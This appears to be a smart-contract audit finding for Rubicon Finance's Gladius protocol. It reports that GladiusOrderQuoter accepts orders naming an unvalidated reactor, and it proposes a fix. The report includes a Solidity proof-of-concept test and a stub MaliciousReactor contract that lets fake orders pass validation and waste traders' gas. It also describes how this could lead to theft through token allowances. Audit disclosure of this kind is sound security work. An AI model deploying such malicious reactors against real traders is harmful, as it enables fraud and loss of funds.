Rare Pistachio Guppy

high

# Attacker can submit malicious order and user may lose funds interacting with it

## Summary
**GladiusOrderQuoter** does not verify if the **reactor** in an order is valid, attacker can submit order with malicious reactor, user who interacts with this order may suffer a loss.

## Vulnerability Detail
[GladiusOrderQuoter](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/lens/GladiusOrderQuoter.sol#L10) is used on the off-chain side, and validates orders during their creation, before pushing them into database. 

Market maker can send POST request to the API to submit an order, **GladiusOrderQuoter** will validate the order through the quoter, before accepting it.

To validate an order, [quote(...)](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/lens/GladiusOrderQuoter.sol#L26-L30) function is called, this function quotes the given order, returning the [ResolvedOrder](https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/base/ReactorStructs.sol#L44-L50) object which defines the current input and output token amounts required to satisfy it:
```solidity
    function quote(
        bytes memory order,
        bytes memory sig,
        uint256 quantity
    ) external returns (ResolvedOrder memory result) {
        try
            getReactor(order).executeWithCallback(
                SignedOrder(order, sig),
                quantity,
                bytes("")
            )
        {} catch (bytes memory reason) {
            result = parseRevertReason(reason);
        }
    }
```
After the order is validated by **GladiusOrderQuoter**, it is pushed into database, and takers will see the order through API, which is similar to this:
```url
https://gladius-staging.rubicon.finance/dutch-auction/orders?orderStatus=open
```
And response looks like below:
```json
{
    "orders": [
        {
            "outputs": [
                {
                    "recipient": "0x59c6d0c21d9700f3dbd25c7533c87eba53ffbfff",
                    "startAmount": "4800000000",
                    "endAmount": "4800000000",
                    "token": "0x7F5c764cBc14f9669B88837ca1490cCa17c31607"
                }
            ],
            "orderStatus": "open",
            "createdAt": 1706616806,
            "encodedOrder": "0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000065b8e7df0000000000000000000000000000000000000000000000000000000065b8eb6200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000da10009cbd5d07dd0cecc66161fc93d7c9000da10000000000000000000000000000000000000000000001045aaf5a44b74000000000000000000000000000000000000000000000000001045aaf5a44b74000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000cb23e6c82c900e68d6f761bd5a193a5151a1d6d200000000000000000000000059c6d0c21d9700f3dbd25c7533c87eba53ffbfff00000000000000000000000000000000000000000000000000000000000000310000000000000000000000000000000000000000000000000000000065b8eb63000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000007f5c764cbc14f9669b88837ca1490cca17c31607000000000000000000000000000000000000000000000000000000011e1a3000000000000000000000000000000000000000000000000000000000011e1a300000000000000000000000000059c6d0c21d9700f3dbd25c7533c87eba53ffbfff",
            "signature": "0xa144d267c8585e33464fe69142cedad2ef830d44768b6ab35071a6004cc8dd1a38ce1420e2fff21888164a50446e5ad7218369cda9c3ea85c16913a52fe9c5d11b",
            "chainId": 10,
            "orderHash": "0x41e6987cd72a36aff25d89313cfb77b187b44bf18c2835f79acac34ca257b004",
            "input": {
                "endAmount": "4802688000000000000000",
                "token": "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
                "startAmount": "4802688000000000000000"
            },
            "price": 1000560000000,
            "type": "Dutch"
        }
    ]
}
```
The problem is **GladiusOrderQuoter** does not verify if the **reactor** in an order is valid, an attacker can submit an order with malicious reactor which may, for instance, do nothing but executing gas-consuming operations, the validation will still passed and user will suffer a loss.

Please see the test codes:
```solidity
    function test_audit_submit_order_with_malicious_reactor() public {
        // GladiusOrderQuoter
        GladiusOrderQuoter quoter = new GladiusOrderQuoter{salt: bytes32(uint256(2))}();

        // Deploy malicious reactor
        MaliciousReactor maliciousReactor = new MaliciousReactor();

        // Build order with malicious reactor
        (GladiusOrder memory order, bytes memory sig) = buildOrderAndSig(maliciousReactor);

        // Quote validation passed and order with malicious reactor is pushed to Gladius database
        quoter.quote(abi.encode(order), sig, 2e18);

        // Trader executes order only to waste gas
        SignedOrder memory signedOrder = SignedOrder({
            order: abi.encode(order),
            sig: sig
        });
        IGladiusReactor gladiusReactor = getReactor(abi.encode(order));
        gladiusReactor.execute(signedOrder);
    }

    function getReactor(
        bytes memory order
    ) public pure returns (IGladiusReactor gladiusReactor) {
        assembly {
            let orderInfoOffsetPointer := add(order, 64)
            gladiusReactor := mload(
                add(orderInfoOffsetPointer, mload(orderInfoOffsetPointer))
            )
        }
    }

    function buildOrderAndSig(MaliciousReactor maliciousReactor) private view returns (GladiusOrder memory order, bytes memory sig) {
        OrderInfo memory orderInfo = OrderInfo({
            reactor: maliciousReactor,
            swapper: swapper,
            nonce: 0,
            deadline: block.timestamp + 1 days,
            additionalValidationContract: IValidationCallback(address(0)),
            additionalValidationData: bytes("")
        });

        DutchInput memory dutchInput = DutchInput({
            token: tokenIn,
            startAmount: 2e18,
            endAmount: 2e18
        });

        DutchOutput memory dutchOutput = DutchOutput({
            token: address(tokenOut),
            startAmount: 10e18,
            endAmount: 1e18,
            recipient: swapper
        });

        DutchOutput[] memory outputs = new DutchOutput[](1);
        outputs[0] = dutchOutput;

        order = GladiusOrder({
            info: orderInfo,
            decayStartTime: block.timestamp + 6 hours,
            decayEndTime: block.timestamp + 12 hours,
            exclusiveFiller: address(0),
            exclusivityOverrideBps: 0,
            input: dutchInput,
            outputs: outputs,
            fillThreshold: 1
        });

        sig = signOrder(
            swapperPrivateKey,
            address(permit2),
            order
        );
    }
```
The malicious reactor contract may look like below:
```solidity
contract MaliciousReactor is IGladiusReactor {
    using PartialFillLib for GladiusOrder;
    using DutchDecayLib for DutchOutput[];
    using DutchDecayLib for DutchInput;

    function execute(SignedOrder calldata order) external override payable {
        // do somthing gas-consuming
    }

    function executeWithCallback(
        SignedOrder calldata order,
        bytes calldata callbackData
    ) external payable {
        // do somthing gas-consuming
    }

    function executeBatch(SignedOrder[] calldata orders) external override payable {
        // do somthing gas-consuming
    }

    function executeBatchWithCallback(
        SignedOrder[] calldata orders,
        bytes calldata callbackData
    ) external override payable {
        // do somthing gas-consuming
    }

    function execute(
        SignedOrder calldata order,
        uint256 quantity
    ) external override payable {
        // do somthing gas-consuming
    }

    function executeWithCallback(
        SignedOrder calldata order,
        uint256 quantity,
        bytes calldata callbackData
    ) external override payable {
        // do somthing gas-consuming

        ResolvedOrder[] memory resolvedOrders = new ResolvedOrder[](1);
        resolvedOrders[0] = resolve(order, quantity);

        IReactorCallback(msg.sender).reactorCallback(
            resolvedOrders,
            callbackData
        );
    }

    function executeBatch(
        SignedOrder[] calldata orders,
        uint256[] calldata quantities
    ) external override payable {
        // do somthing gas-consuming
    }

    function executeBatchWithCallback(
        SignedOrder[] calldata orders,
        uint256[] calldata quantities,
        bytes calldata callbackData
    ) external override payable {
        // do somthing gas-consuming
    }

    function resolve(
        SignedOrder calldata signedOrder,
        uint256 quantity
    ) internal view returns (ResolvedOrder memory resolvedOrder) {
        GladiusOrder memory order = abi.decode(
            signedOrder.order,
            (GladiusOrder)
        );

        InputToken memory input = order.input.decay(
            order.decayStartTime,
            order.decayEndTime
        );
        OutputToken[] memory outputs = order.outputs.decay(
            order.decayStartTime,
            order.decayEndTime
        );

        resolvedOrder = ResolvedOrder({
            info: order.info,
            input: input,
            outputs: outputs,
            sig: signedOrder.sig,
            hash: order.hash()
        });
    }
}
```

## Impact
There could be serious impacts to the protocol:
1. Order is submitted off-chain, attacker can submit a very high volume of orders with no cost, the front-end which most users rely on may be swamped with fake orders;

2. Orders validated by **GladiusOrderQuoter** are supposed to be trusted, traders who interact with the malicious orders will get nothing but wasting a lot of gas fees, however this is not their fault;

3. Things can be much worse given that trader may grant token allowance to the malicious reactor, as suggested in the [doc](https://rubicondefi.notion.site/Rubicon-Gladius-Integration-Guide-ee55cbe3ccdf4b88a6780d8ef090599f), if that is the case, user's funds can be stolen:
> Approve the ExclusiveDutchOrderReactor if the trader wishes for instant settlement. The trader can pay gas to immediately “take” orders from Gladius and settle their trade, much like they can on the onchain Rubicon order book

## Code Snippet
https://github.com/sherlock-audit/2024-02-rubicon-finance/blob/main/gladius-contracts-internal/src/lens/GladiusOrderQuoter.sol#L26-L40

## Tool used
Manual Review

## Recommendation
To fix the trust issue in **GladiusOrderQuoter**, please verify if the **reactor** in an order is valid during invalidation:
```diff
+   address public reactor;

+   function setReactor(address _reactor) external onlyOwner {
+       reactor = _reactor;
+   }

    function quote(
        bytes memory order,
        bytes memory sig,
        uint256 quantity
    ) external returns (ResolvedOrder memory result) {
+       require(reactor == getReactor(order), "Invalid reactor");
        ...
    }
```